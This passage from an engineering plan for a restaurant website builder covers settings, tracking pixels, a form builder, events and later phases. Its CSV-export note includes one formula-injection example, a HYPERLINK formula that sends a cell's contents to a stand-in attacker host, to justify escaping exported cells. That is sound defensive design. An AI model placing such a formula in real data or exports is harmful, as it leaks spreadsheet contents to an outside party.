The Add Section modal is already registry-driven, so each kind appears in the catalogue the moment its entry
exists. Keep the modal a flat two-column grid: Owner's 13 fit one screen with no search and no descriptions, and
our categories should collapse to nothing if they would fragment 18 entries into six lonely groups.

---

### Phase 5 — Brand feature toggles and site settings · 3–4 d — 🟡 **BUILT 2026-08-20, migration not applied**

The two-layer model the teardown makes explicit: **brand settings say *whether*; the page editor says *where and
what it says*.**

- [x] `merchant_sites.features` with `Customer reviews`, `Rewards`, `Gift cards`, `Reservations` toggles.
- [x] Section availability honours `requiresFeature` in the Add Section modal — the kind is **absent**, with one
      line saying which toggle turns it on.
- [x] Brand-level **social + reservation links**, consumed by footer and nav.
- [x] **Cuisines** and **price range** — these feed JSON-LD and any future listing surface.
- [x] `Landing page default location` + `Force location selection before menu`. This is our multi-location pricing
      problem exactly, and Owner's answer is a merchant toggle plus a recommendation, which matches
      `canShowPrices()` already in [`render-context.ts`](../../../lib/site-builder/render-context.ts).
- [x] Per-page SEO — title, description, OG image. Owner has none anywhere; it is cheap and we sell to restaurants
      who care about search.

**Landed.** `site-settings.ts` (new — the whole layer, pure) · `20260820120000_website_site_settings.sql` (new:
`features` + `brand` jsonb, and a wholesale replacement of `get_public_site_page` to return both) ·
`SettingsScreen.tsx` + `/dashboard/website/settings` (new) · `site.ts` (+`UpdateSiteFeatures`, `UpdateSiteBrand`) ·
registry (`requiresFeature`, `availableKinds`, `kindsAwaitingFeature`) · `mutations.ts` (`feature_off`) ·
`AddSectionModal.tsx` (omits gated kinds, names the toggle) · `render-context.ts` (`site.features`, `site.brand`) ·
`public-context.ts` + `site-context.ts` + `resolve-render-mode.ts` (threading) · `FooterSection.tsx` (social) ·
`HeaderSection.tsx` (Book a table) · `json-ld.ts` (`servesCuisine`, `priceRange`, `sameAs`, `ReserveAction`) ·
`SectionDrawer.tsx` (the Search & sharing disclosure) · `built-site.tsx` (OG image, `noindex`).

Three decisions worth recording, because none of them is obvious from the work items:

1. **Turning a feature off never deletes a section.** It removes the kind from the Add Section catalogue and
   nothing else. A toggle that silently took published content off a live site would be a terrible thing to
   discover, and a merchant may be turning it off *because* they are sorting the existing page out. Said in
   plain words on the settings screen so nobody has to find out by experiment.
2. **The default-location rule lives in exactly one function.** `resolvePricingLocation` decides what a page is
   priced against — page location wins, then the brand default, then nothing — and it validates the default
   against the storefronts that actually exist, so a branch that closes degrades to "hide prices" rather than to
   quoting a closed kitchen. The public renderer and the settings screen read the same list for the same reason.
3. **Structured data may only claim what is true twice over.** `acceptsReservations` needs the toggle *and* the
   link; a booking URL left behind after Reservations was switched off would send a searcher to a dead end,
   which is worse than emitting nothing.

Two things fixed beyond the work items:

- **The builder canvas drew no navigation.** `buildRenderContext` hardcoded `nav: []`, so a merchant arranging
  their links in the nav editor watched nothing change in the preview beside them. Defensible while nothing could
  edit the nav; not defensible since Phase 0 shipped the editor. It now reads the real nav.
- **The footer's `showSocial` was inert**, by its own admission — the comment said the site-level config "arrives
  with the settings surface". This is that surface, so it renders. Names rather than icons: lucide has Instagram,
  Facebook, X and YouTube but not TikTok, Yelp or Tripadvisor, and four logos beside three words reads as a
  failed load.

**Verification.** 32 new unit tests (`site-settings.test.ts`); full site-builder suite 522/522; `tsc` clean over
the touched surface; eslint clean.

**Still needs a human.** The migration is written and applied nowhere — staging included. Until it is,
`merchant_sites.features` does not exist, the settings screen cannot save, and `get_public_site_page` returns the
old column set (which `resolve-render-mode` tolerates: both fields resolve to "nothing set"). After applying:
turn Customer reviews on, confirm Reviews appears in Add Section and the line beneath the grid disappears; set a
social account and confirm it reaches the published footer; set a default location on a multi-location merchant
and confirm prices appear on the brand home page.

---

### Phase 6 — Tracking · 2–3 d — 🟡 **BUILT 2026-08-20, migration not applied**

Highest value per unit of effort in the whole plan.

- [x] `/dashboard/website/tracking` — four fields: Facebook Pixel, Google Analytics (GA4), Google Tag Manager,
      TikTok Pixel. Placeholders double as format documentation (`G-`, `GTM-`, `C4…`).
- [x] Zod patterns per provider; persist through a narrow `UpdateSiteIntegrations` wrapper, never arbitrary JSON
      from the client.
- [x] `SiteAnalyticsScripts` on the **built site only** — do not reuse the storefront's columns as the source of
      truth; a merchant may deliberately measure marketing and checkout separately.
- [x] A small typed event vocabulary: page view, Order Online click, form submit, reservation start/complete,
      application submit, event CTA click.
- [x] Update CSP hosts — **there is no CSP to update.** See below.
- [x] Decide consent behaviour by target jurisdiction — **decided: no gate, US-only.** See below.
- [x] Google Search Console verification. **Generic `<head>` snippet slot: considered and declined.** See below.

**Landed.** `tracking.ts` (new — specs, patterns, `resolveTracking`, the event vocabulary) ·
`20260821120000_website_tracking.sql` (new: no storage change — `integrations` already existed — but a third
wholesale replacement of `get_public_site_page`, which could not see the column) · `TrackingScreen.tsx` +
`/dashboard/website/tracking` (new) · `SiteAnalyticsScripts.tsx` + `TrackingEvents.tsx` (new) ·
`site.ts` (+`UpdateSiteIntegrations`) · `resolve-render-mode.ts` (threading) · `built-site.tsx` (mounts the
scripts) · `section-shell.tsx` + `HeaderSection.tsx` (the two call sites that exist today) ·
`render.test.tsx` (the architecture guard, extended — see below).

Four decisions, three of them the work items above asking to be decided:

1. **No `<head>` snippet slot, and this should not be revisited casually.** It is arbitrary merchant-authored
   HTML executing on a `*.dexaposai.com` subdomain — which makes a compromised merchant login into script
   execution on our domain, not just on their page. It also contradicts a principle this feature already holds
   in `primitives.ts`: merchant-authored CSS is refused on exactly these grounds, and script is strictly worse.
   If a real merchant need appears, the shape is an **HQ-only** field under `/manage`, entered by staff on the
   merchant's behalf, never a self-serve textarea.
2. **No consent gate. That makes this US-only.** GDPR, UK PECR and Brazil's LGPD all require opt-in *before*
   non-essential trackers fire, and these load unconditionally. This is a blocking item for the first EU or UK
   merchant, not a nice-to-have, and it is recorded here rather than buried in a comment.
3. **There is no Content-Security-Policy in this application** — no `headers()` in `next.config.ts`, nothing in
   `middleware.ts`. So the work item had nothing to update. `trackingScriptHosts()` returns the list anyway, so
   whoever adds a CSP has it rather than discovering it one broken pixel at a time.
4. **Meta and TikTok standard events are only claimed where an honest one exists.** `reservation_complete` →
   `Schedule` and `application_submit` → `SubmitApplication` are real. `order_click` → `InitiateCheckout` would
   be a lie that quietly corrupts the ad campaign it feeds, so it is sent as a custom event instead.

**The architecture guard caught this work, and was then strengthened.** `render.test.tsx` asserts no `"use client"`
anywhere under `components/site-builder/` outside the known dashboard directories — because the builder canvas
renders through `renderToStaticMarkup`, which Next refuses in any module graph reaching a client component.
`TrackingEvents.tsx` is a deliberate client island, and it failed. Rather than widen the exclusion list and move
on, `tracking/` is excluded *and* a second test now asserts that nothing in the render graph imports from it —
so the carve-out cannot silently become the breakage the original test exists to catch. Verified by introducing a
violation and watching the new test fail.

**Why a delegated listener rather than `onClick`.** Sections are server components and that is load-bearing.
A tracked element carries `data-sb-track="order_click"`; one document-level listener fans it out to whichever
pixels are installed. Phases 7–10 add call sites — an attribute — not JavaScript. Forms now reports
`form_submit` after a successful POST/redirect/GET, and an event ticket click reports `event_cta_click`; the event
detail route also mounts the pixel scripts rather than assuming the ordinary page route did it. The two events
still awaiting their products are `reservation_complete` and `application_submit`.

**Verification.** 23 new unit tests (`tracking.test.ts`), most of them adversarial: every provider pattern is
tested against quote, backtick, `</script>` and full breakout payloads, at the schema, at the raw pattern, and
on the read path — because these values are interpolated into inline script source, so the pattern *is* the
security boundary. Full site-builder suite 546/546; `tsc` clean over the touched surface; eslint clean.

**Still needs a human.** `20260821120000` is applied nowhere, and it depends on `20260820120000` (Phase 5) being
applied first — apply both in filename order. Until then a merchant can save pixel IDs and no visitor will
receive them, because the public RPC cannot see the column. After applying: save a GA4 ID, publish, load the
public site and confirm `gtag` fires a `page_view`, then click Order Online and confirm `order_click`.

---

### Phase 7 — Forms · 10–14 d — 🟡 **BUILT 2026-08-20, migration not applied**

The best-built sub-feature in Owner's Website tab, and the clearest demonstration of "one shell, reused".

- [x] **The form builder *is* the page builder.** Same chrome, same gutter controls, same `Add Section` dividers,
      same Publish. Each field is a "section". If our form builder looks different from our page builder we have
      duplicated the work *and* doubled what the merchant must learn.
- [x] **10 semantic field types**: Name · Text Field · Email · Single Choice · Phone Number · Multiple Choice ·
      Address · Heading · Date & Time · Paragraph. `Name` and `Email` are *distinct types*, not a text field with
      validation — that is what makes the submissions table have real columns and what would let submissions feed
      `customers` later.
- [x] Forms list: **Name · Responses · Status**, where **Status is usage** (`1 page` / `Not used`), not publish
      state. It is the cheapest possible way to surface an orphaned form — the same class of problem as our nav
      hole, made visible as a column.
- [x] Submissions inbox: columns derived from the form's own fields, unread dot, and **Export as the primary
      action** — that is what merchants actually do with leads.
- [x] Public submission action: loads the authoritative definition, rejects unknown fields, sanitizes every value,
      caps the body, rate-limits by IP and form, honeypot + minimum-fill-time via
      [`lib/cms/form-security.ts`](../../../lib/cms/form-security.ts). Generic responses that never leak whether a
      form id exists.
- [x] Store, then notify. Delivery state, retry, and a visible failure surface.

**Landed.** `lib/site-builder/forms/` (new — `fields.ts` the ten-kind registry, `document.ts`,
`mutations.ts`, `submission.ts`, `form-map.ts`, `protocol.ts`, `export.ts`; all pure) ·
`20260822120000_website_forms.sql` (new: `site_forms`, `site_form_submissions`, tenancy + counter triggers,
RLS, `get_public_site_form`) · `actions/forms.ts` (new) · `FormsScreen` / `FormBuilder` / `SubmissionsScreen`
and their three routes (new) · `PublicForm.tsx` + `FormSection.tsx` (new) · `api/site-forms/submit/route.ts`
(new) · `form` section kind registered · `resolveForm` on `RenderContext` · `FormPicker` + a `form` control
kind in `schema-introspect.ts`.

Five decisions worth recording:

1. **The public form ships no JavaScript.** It is a native `<form method="post">` to a route handler, which
   validates, stores and redirects (POST/redirect/GET). The reflex choice — a client island doing `fetch` —
   would mean a restaurant's catering enquiry form silently doing nothing whenever a script bundle fails, and a
   form is the one thing on a marketing site that *must* work. It also follows the precedent `HeaderSection`
   already set with its `<details>` navigation menu, and it keeps sections server-only.
2. **The definition is the allowlist.** `buildSubmission` iterates the *form's fields*, never the posted body,
   so an unknown key is structurally impossible to store rather than merely filtered. Without that a form is an
   open jsonb write endpoint with a text box in front of it.
3. **No form version history, deliberately.** Every submission snapshots the question label *as it was worded
   at the time*, so a two-year-old lead still renders correctly after the form is rewritten — which is the only
   thing a definition history would have bought, and it avoids "which version's field #3 is this answer?"
4. **Semantic field kinds fill real columns.** `contact_email` is populated from whichever field has
   `semantic: "email"`, not from a field *named* email — so a merchant can label it "Where can we reach you?"
   and the inbox column still works. This is what would let submissions feed `customers` later.
5. **Archive is soft and delete is absent.** The submissions are real people's enquiries; a merchant tidying
   their forms list must not be able to cascade a year of leads away with one click.

**CSV export is treated as a security surface, not formatting.** A cell beginning `=`, `+`, `-` or `@` executes
as a formula in Excel, Sheets and LibreOffice — `=HYPERLINK("http://evil.test?"&A1)` typed into a public
contact form becomes a live exfiltration link the moment the owner opens their leads. Cells are prefixed and
quoted, and the export unions every question ever asked so historical leads are not silently dropped.

**Two lint rules caught real bugs** and both fixes are in: `Date.now()` during render in `PublicForm` (moved
onto the render context, which is assembled once per request in a loader) and a ref written during render in
the builder's autosave (mirrored through an effect).

**Verification.** 48 new unit tests (`forms.test.ts` 38, `forms-export.test.ts` 10), heavily weighted toward
the submission allowlist and CSV escaping. Full site-builder suite 594/594; `tsc` clean over the touched
surface; eslint clean.

**Notification follow-up landed 2026-08-20.** The public handler inserts the response before it contacts Resend.
It snapshots the configured recipients on that submission, records pending/sent/failed state, attempt count,
provider message ids and the last error, and still shows the visitor a success when only email fails. The inbox
shows that state and gives an authenticated merchant a retry button; retries use an optimistic `sending` claim so
two dashboard tabs cannot send the same response concurrently. `notification.ts` owns escaped email rendering,
`notification-delivery.ts` owns the provider call, and `form-notifications.test.ts` covers the output boundary.

**Remaining constraints:**

- **Rate limiting depends on `check_rate_limit`**, the SQL function `lib/cms/form-security.ts` already uses.
  It fails *open* by design (a limiter outage must not take a form offline), so if that function is absent in a
  given environment the endpoint still works and still has its honeypot — but it is not rate limited. Worth
  confirming it exists before this goes live.
- **No per-field error display.** A failed validation redirects back with a generic banner; the browser's own
  `required` / `type="email"` catches the common cases before the post. Round-tripping field-level errors
  without JavaScript needs the answers echoed back too, which is a bigger piece than it looks.

**Follow-up verification.** Three notification-boundary tests added; focused site-builder suite 547/547; eslint
clean over the touched surface. The repository-wide `tsc` command still has unrelated pre-existing failures, but
its output contains no error from a file touched by this follow-up.

---

### Phase 8 — Events · 5–7 d — 🟡 **BUILT 2026-08-20, migration not applied**

- [x] `/dashboard/website/events` list + `New Event` modal: **Photo (required, validated on open)** · Name ·
      Description · Location · Start date · Start time · End time · Repeat · optional Ticket link.
- [x] Restaurant-shaped time defaults (`11:00 PM → 2:00 AM`) and a reduced recurrence set
      (`Don't repeat / Daily / Weekly / Monthly / Yearly`). No RRULE. Restaurants run weekly trivia and monthly
      brunches; nobody needs iCal-grade recurrence.
- [x] **Ticketing is a link, not a system.** No capacity, no price, no RSVP — events are listings.
- [x] `events` section resolves upcoming published events; a system Events page mounts it.
- [x] Empty-state copy on the **public** page: *"There are no events right now — check back later."* That copy is
      what makes it safe to publish an empty Events page, which is the whole reason per-page publish exists.
- [x] `/events/{slug}` detail pages, Event JSON-LD, expired-event behaviour.

**Landed.** `lib/site-builder/events/event.ts` (new — occurrence maths, schema, formatting) ·
`event-map.ts` (new) · `20260823120000_website_events.sql` (new: `site_events`, tenancy trigger, RLS,
`get_public_site_events`) · `actions/events.ts` (new) · `EventsScreen` + `/dashboard/website/events` (new) ·
`events` section kind + `EventsSection` (new) · `app/sites/[slug]/events/[eventSlug]` (new) ·
`buildEventJsonLd` in `json-ld.ts` · `events` / `eventUrl` on `RenderContext` · both renders wired.

Decisions worth recording:

1. **Dates are stored as calendar values, not instants.** A restaurant's event happens at 11pm *where the
   restaurant is*. A `timestamptz` would move it by an hour when the clocks change — which is exactly the
   weekend a restaurant is most likely to be running one. The occurrence maths works in the viewer's local
   time, which is also why "upcoming" cannot be filtered in SQL and the RPC returns all live events.
2. **An event is upcoming until it *ends*, not until it starts.** Friday trivia must not vanish from the
   homepage at 9:01pm while the room is still full. With the shipped `11:00 PM → 2:00 AM` default the
   overnight case is the *common* one, so an end time at or before the start means the next day.
3. **Monthly and yearly repeats clamp rather than roll.** The 31st in a 30-day month renders on the 30th and
   then returns to the 31st — the intended day is kept and only the occurrence is clamped. Rolling would march
   the date forward through every short month until it had wandered into a different week.
4. **The slug is not recomputed on rename.** An event's address may already be on a poster or in somebody's
   inbox; moving it because the merchant fixed a typo would break every one of those links for a cosmetic edit.
5. **A finished event still resolves.** Its URL may be shared, so the detail page says it has finished rather
   than 404ing — and it drops the ticket button, which would otherwise send people to a dead sale.

**Two registry invariants caught mistakes.** `liveFields` must be empty for a kind with no `bindingTypes`, and
the events section initially claimed one — events do not go through the binding resolver at all, they arrive on
the context as a list, so claiming a live field described a mechanism that is not in use. And `SiteImage` takes
an `AssetRef` rather than a URL; event photos are not in the page document, so they go through its documented
`fallbackUrl` escape hatch and keep the lazy-loading and no-broken-image guarantees.

**Routing.** `/events/{slug}` is a static route segment, so Next resolves it before the built-site catch-all —
the same mechanism that already keeps `/checkout` and `/t/{token}` working. Nothing was added to
`RESERVED_PATH_SEGMENTS`: the single segment `/events` is untouched and stays available as an ordinary
merchant page, which is where the listing lives.

**Verification.** 36 new unit tests (`events.test.ts`), concentrated on the occurrence maths — overnight
events, DST-safe date arithmetic, weekday stability, month-end clamping, 29 February, and a termination bound
so a corrupt row cannot spin a render. Full site-builder suite 626/626; `tsc` clean over the touched surface;
eslint clean.

**NOT built:**

- **No system Events page.** The plan's "a system Events page mounts it" is not automatic — a merchant adds an
  `Events` section to a page they create. Auto-provisioning a page raises questions this phase did not need to
  answer (what happens when they delete it; does it reappear), and the section works on any page today.
- **Recurring events never end.** Owner has no "repeat until" and neither does this, so weekly trivia repeats
  for ever. Correct for the common case, wrong for a six-week series — worth a `repeat_until` date later.
- **No per-event publish state**, matching Owner: an event exists or is archived. The *page* carrying the
  section is where a merchant parks things, which is what per-page publish is for.

---

### Phase 9 — Careers · 8–12 d

The only location-scoped child. `site_pages.location_id` already models this; the careers *entity* is
location-scoped from the start.

- [ ] `/dashboard/website/careers` with **Open Roles** and **Applications** tabs, each its own route.
- [ ] `Add new role` modal, kept **this small**: Role · `Add to website` toggle · optional `Per hour salary range`
      with numeric Min/Max. No description editor. The value is "post a job in 15 seconds"; a rich job-description
      editor is a different product.
- [ ] `Add to website` is publish state **on the entity** — pull a listing without deleting it and losing its
      applications.
- [ ] Applications list: Name · Roles · Email · Phone · Received · **Resume (View)** · Delete. `Roles: All` for
      applicants to the general listing, so the page still accepts people when nothing is posted.
- [ ] **Export Applications** — hiring happens in email and spreadsheets. Stream it, escape formula injection.
- [ ] Private resume storage: PDF/DOCX allowlist, size cap, randomized names, signed short-lived URLs, malware
      scan before production, and a written retention/deletion policy. This is the only genuinely new
      infrastructure in the phase.
- [ ] Reserve `/careers` as a system path; render visible roles in the site's theme; JobPosting JSON-LD; hidden or
      closed jobs cannot accept new applications.
- [ ] Nav includes Careers automatically when at least one role is visible, and drops it when none are. No stale
      link is possible.

---

### Phase 10 — Customer support · 6–9 d

Copy Owner's taxonomy; add the workflow Owner lacks.

- [ ] `customer_order_support_requests` with the closed issue taxonomy — `Wrong or missing items` · `Food quality`
      · `General` · `Payment issue` (+ `Delivery`). Short and closed is the point: the merchant scans a column and
      sees a pattern without reading forty comments.
- [ ] Guest entry point from order confirmation / tracking / history, proving order ownership via the customer
      session or a signed order token. Do not leak order existence through differing error messages.
- [ ] `/dashboard/website/customer-support` list matching Owner's: Name · Issue Type · Comment · Date, plus
      search, filters, location scope and pagination.
- [ ] **What Owner is missing, and we add:** a link from each row to its order, and a resolved/unresolved state.
      As shipped, Owner's is a list a merchant reads and forgets.
- [ ] Keep it separate from `customer_feedback` (reviews) and `support_tickets` (merchant → Dexa HQ). Merging any
      two produces invalid required fields and reporting that cannot answer basic questions.

---

### Phase 11 — Lifecycle, SEO and hardening · 8–12 d

- [ ] Sitemap and robots for published pages, events and open roles.
- [ ] BreadcrumbList / Event / JobPosting structured data.
- [ ] Page version history and rollback UI, with the dialog stating explicitly that live POS prices are not
      rolled back.
- [ ] Retention and anonymization jobs for submissions, support requests and applications.
- [ ] RLS test per new table; anonymous access only through minimal public RPCs.
- [ ] Public E2E: form submit · reservation · event · review · support request · job application.
- [ ] Accessibility: axe, focus order, drawer/modal trapping, labels and errors, reduced motion, contrast.
- [ ] Security: stored XSS, SVG/PDF/resume handling, MIME spoofing, rate limits, id enumeration, signed-URL
      expiry, CSV injection, analytics-id injection.
- [ ] Observability: submission delivery failures, upload errors, publish errors, public rate-limit counts.

---

## 8. Sizing and build order

| Order | Phase | Estimate | Depends on |
|---:|---|---:|---|
| 1 | Close the live holes (nav, masthead move) | 3–4 d | — |
| 2 | Capability flags + caps | 3–4 d | 1 |
| 3 | Content reshape (schema v2) | 3–5 d | 2 |
| 4 | Assets and logo | 7–10 d | 1 |
| 5 | Catalogue completion | 8–12 d | 2, 4 |
| 6 | Brand toggles + site settings | 3–4 d | 2 |
| 7 | Tracking | 2–3 d | — |
| 8 | Forms | 10–14 d | 2, 4 |
| 9 | Events | 5–7 d | 4, 5 |
| 10 | Careers | 8–12 d | 4 |
| 11 | Customer support | 6–9 d | — |
| 12 | Lifecycle / SEO / hardening | 8–12 d | all |

**One engineer: ~13–17 working weeks.** With three, after phases 1–2 land, Assets→Events→Careers, Forms→Support,
and Catalogue→Toggles→Tracking run in parallel: **~7–9 calendar weeks** plus rollout.

Ship by subfeature flag — internal merchants, then a pilot cohort, then general availability. Do not hold the
independent safe ones (Tracking, Customer support) behind Forms.

**Do not estimate the screenshot UI alone.** The public unauthenticated paths, RLS, delivery retries, uploads and
file handling are most of the production work.

---

## 9. Acceptance criteria

**Builder core.** A merchant creates, edits, previews, publishes and unpublishes Article/Showcase/Blank pages; the
public URL serves the published snapshot with live menu and location data; every published page is reachable from
the navigation; a merchant cannot produce a page with the hero above the header, a headline that wraps to four
lines, a deleted footer, or an unreachable page.

**Sections.** All 18 kinds render, validate, normalize and publish. Controls rendered per section match the
registry flags exactly, and the mutation layer refuses anything the UI does not offer.

**Assets.** Logo, gallery, hero carousel, content background and media all upload and render optimized images with
alt text. No page document contains a CDN URL.

**Each child.** Every content-producing dashboard feature has a functioning public consumer, and every public
input is rate-limited, validated and sanitized. Cross-tenant reads fail in a test.

**Until all of the above is true**, describe the product as *Owner-shaped Pages and editor* — not Owner Website
parity.

---

## 10. Risks

| Risk | Mitigation |
|---|---|
| **The v1 → v2 content migration is the only breaking change here.** A bad conversion silently flattens merchant copy. | Migrate on *read*, never rewrite JSONB in SQL. Test against captured real documents. Deploy readers before writers. Migrations never throw — `normalizePage` repairs what they produce. |
| Retightening caps to 50/500/150 truncates existing merchant headlines. | Truncate-and-record on read, never reject. Audit how many stored values exceed the new caps *before* the change and report the number. |
| Removing Hide/Duplicate takes away something merchants may be using. | `hidden` stays honoured by the renderer; only the control goes. Check usage on real sites before shipping the removal. |
| Nav seeding could reorder a nav a merchant has already hand-ordered. | Seed only appends, only for pages that are not already present, and never reorders. |
| Resume storage is personal data with a legal surface. | Private bucket, signed URLs, per-row delete, written retention policy — all before the feature is enabled for any merchant. |
| Scope creep back toward design freedom. | Every added control needs a written reason. The teardown's framing is the test: *the simplicity is removed decisions*. |

---

## 11. Maintenance

Update this document in place as work lands. Record contracts, dependencies, verification, manual QA and remaining
work here rather than in a new dated file. Corrections from the user go into
[`docs/engineering/developer-experience/lessons.md`](../../engineering/developer-experience/lessons.md).

**Reference:** [`docs/research/owner-com-website-tab/`](../../research/owner-com-website-tab/) — keep it internal.
Three screenshots (`18`, `22`, `23`) contain real customer and applicant PII.
